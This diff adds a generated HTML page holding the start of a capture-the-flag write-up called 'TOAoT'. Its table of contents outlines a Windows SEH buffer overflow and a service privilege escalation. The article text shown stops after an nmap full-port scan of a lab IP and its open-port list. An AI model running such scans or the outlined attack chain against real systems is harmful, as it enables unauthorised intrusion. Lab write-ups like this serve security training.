@@ -1,0 +1,2589 @@
+<!DOCTYPE html><html lang="en" class="no-js"><head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../..">
+      
+      
+        <link rel="next" href="../../HackTheBox/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>TOAoT - rdrg0x</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  <link href="../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
+            html.glightbox-open { overflow: initial; height: 100%; }
+            .gslide-title { margin-top: 0px; user-select: text; }
+            .gslide-desc { color: #666; user-select: text; }
+            .gslide-image img { background: white; }
+            .gscrollbar-fixer { padding-right: 15px; }
+            .gdesc-inner { font-size: 0.75rem; }
+            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
+            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
+            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
+        </style></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#toaot" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="rdrg0x" class="md-header__button md-logo" aria-label="rdrg0x" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            rdrg0x
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              TOAoT
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-purple" aria-hidden="true" type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required="">
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix="">
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="rdrg0x" class="md-nav__button md-logo" aria-label="rdrg0x" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
+
+    </a>
+    rdrg0x
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix="">
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked="">
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Writeups
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Writeups
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" checked="">
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Local
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Local
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TOAoT
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TOAoT
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reconnaissance
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Web Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#credential-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential Discovery
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smb-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SMB Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#buffer-overflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Buffer Overflow
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Buffer Overflow">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#determining-the-seh-offset" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Determining the SEH Offset
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#finding-a-poppopret-sequence" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Finding a POP/POP/RET Sequence
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#redirecting-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Redirecting Execution
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#identifying-bad-characters" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Identifying Bad Characters
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#building-the-debugging-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Building the Debugging Exploit
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#deploying-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Deploying the Exploit
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial Access
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#host-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Host Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#verifying-directory-permissions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Verifying Directory Permissions
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#understanding-the-vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Understanding the Vulnerability
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-the-service" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploiting the Service
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#restarting-the-service" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Restarting the Service
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#obtaining-system" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Obtaining SYSTEM
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#root-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Root Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HackTheBox
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3">
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TryHackme
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    TryHackme
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/alfred/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Alfred
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/ADBasicEnum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AD Basic Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/anthem/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Anthem
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/atlas/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Atlas
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/attackingkerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacking kerberos
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/attacktivedirectory/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacktive Directory
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/basicpentesting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Basic Pentesting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/blaster/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blaster
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/blog/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blog
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/blue/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blue
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/blueprint/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blueprint
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/bolt/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bolt
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/brainpan/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Brainpan
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/brainstorm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Brainstorm
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/chillhack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chill Hack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/colddboxeasy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ColddBox Easy
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/cyberheroes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CyberHeroes
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/dailybugle/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Daily Bugle
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/dombasedattacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DOM-Based Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/elbandito/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    El Bandito
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tags
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reconnaissance
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Web Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#credential-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential Discovery
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smb-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SMB Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#buffer-overflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Buffer Overflow
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Buffer Overflow">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#determining-the-seh-offset" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Determining the SEH Offset
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#finding-a-poppopret-sequence" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Finding a POP/POP/RET Sequence
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#redirecting-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Redirecting Execution
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#identifying-bad-characters" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Identifying Bad Characters
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#building-the-debugging-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Building the Debugging Exploit
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#deploying-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Deploying the Exploit
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial Access
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#host-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Host Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#verifying-directory-permissions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Verifying Directory Permissions
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#understanding-the-vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Understanding the Vulnerability
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-the-service" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploiting the Service
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#restarting-the-service" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Restarting the Service
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#obtaining-system" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Obtaining SYSTEM
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#root-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Root Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="Navigation">
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    Home
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="./" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Writeups
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="./" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Local
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <nav class="md-tags">
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:bufferoverflow" class="md-tag">bufferoverflow</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:local" class="md-tag">local</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:windows" class="md-tag">windows</a>
+      
+    
+  </nav>
+
+
+
+<h1 id="toaot">TOAoT<a class="headerlink" href="#toaot" title="Permanent link">¶</a></h1>
+<blockquote>
+<p>Official Author Writeup</p>
+</blockquote>
+<hr>
+<h2 id="reconnaissance">Reconnaissance<a class="headerlink" href="#reconnaissance" title="Permanent link">¶</a></h2>
+<p>An initial TCP scan was performed to identify the services exposed by the target.</p>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-p-<span class="w"> </span>--open<span class="w"> </span>-sS<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span><span class="m">10</span>.64.165.219<span class="w"> </span>-oN<span class="w"> </span>allPorts.txt<span class="w"> </span>-oG<span class="w"> </span>ports
+</code></pre></div>
+<p>The scan identified several interesting services.</p>
+<div class="highlight"><pre><span></span><code>80/tcp
+445/tcp
+3389/tcp
+8080/tcp
+</code></pre></div>
+<p>A second scan was performed to identify service versions and run the default NSE scripts.</p>
